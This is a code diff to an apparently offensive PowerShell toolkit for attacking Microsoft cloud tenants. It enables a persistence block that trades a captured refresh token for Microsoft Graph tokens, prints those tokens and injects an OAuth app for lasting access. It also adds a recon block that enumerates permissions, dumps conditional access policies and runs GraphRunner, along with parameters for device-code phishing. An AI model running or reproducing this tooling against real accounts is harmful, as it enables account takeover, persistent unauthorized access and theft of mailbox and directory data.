@@ -9,6 +9,8 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [switch]$persistence,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$GraphRecon,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$targetUser,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$firstUser,
@@ -21,7 +23,12 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$AppName,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$Scope
+    [string]$Scope,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$CaptureCode, # Generate a CaptureCode with roadtx , use it? Will try
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$DeviceCode # Generate a Code elsewhere, pass to templating module and replace.ps1
+
 
 )
 
@@ -112,23 +119,11 @@ if ($azureHound) {
     }
 }
 
-# if ($persistence) {
-#     try {
-#         Write-Output "Starting OAuth Injection module..."
-#         .\Modules\Inject-OAuthApp.ps1 -response $response -AppName $AppName -ReplyUrl $ReplyUrl -Scope $Scope 
-#     }
-#     catch {
-#         Write-Error "An error occurred in the persistence block: $_"
-#         # Optionally, you can exit the script here
-#         # exit 1
-#     }
-# }
-
-# if ($persistence) {
-#     try {
+if ($persistence) {
+    try {
         Write-Output "Injecting OAuth App for Persistence (Phirst.ps1)"
 
-        Start-Transcript -Path ".\PersistenceApps.json" -Append
+        Start-Transcript -Path ".\PersistenceApps.log" -Append
         $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari
 
         # Assuming $response is an object with access_token and refresh_token
@@ -138,19 +133,45 @@ if ($azureHound) {
             Write-Host "Access Token from tokens object: $($tokens.access_token)"
             Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
         }
-        Import-Module .\Modules\GraphRunner.ps1
+        . .\Modules\GraphRunner.ps1
         Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
         Invoke-InjectOAuthApp -AppName $AppName -ReplyUrl $ReplyUrl -scope $Scope -Tokens $tokens # *> .\Persistence.json 
         Stop-Transcript
 
-#     catch {
-#             Write-Error "An error occurred in the persistence block: $_"
-#             # Optionally, you can exit the script here
-#             # exit 1
-#         }
-#     }
-# }
+    catch {
+            Write-Error "An error occurred in the persistence block: $_"
+            # Optionally, you can exit the script here
+            # exit 1
+        }
+    }
+}
 
+
+if ($GraphRecon) {
+    try {
+        Start-Transcript -Path ".\GraphRecon.log" -Append
+        $tokz = Invoke-RefreshToMSGraphToken -domain $domain -refreshToken $refresh -Device iPhone -Browser Safari
+
+        # Assuming $response is an object with access_token and refresh_token
+        if ($tokz) {
+            $tokens = New-TokensObject -AccessToken $tokz.access_token -RefreshToken $tokz.refresh_token
+            # Output the tokens for verification (optional)
+            Write-Host "Access Token from tokens object: $($tokens.access_token)"
+            Write-Host "Refresh Token from tokens object: $($tokens.refresh_token)"
+        }
+        . .\Modules\GraphRunner.ps1
+        Invoke-ImportTokens -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token
+        Invoke-GraphRecon -Tokens $tokens -PermissionEnum
+        Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
+        Invoke-GraphRunner -Tokens $tokens
+        Stop-Transcript
+    }
+    catch {
+        Write-Error "An error occurred in the persistence block: $_"
+        # Optionally, you can exit the script here
+        # exit 1
+    }
+}
 
 
 ### Refresh to Graph, Dump emails
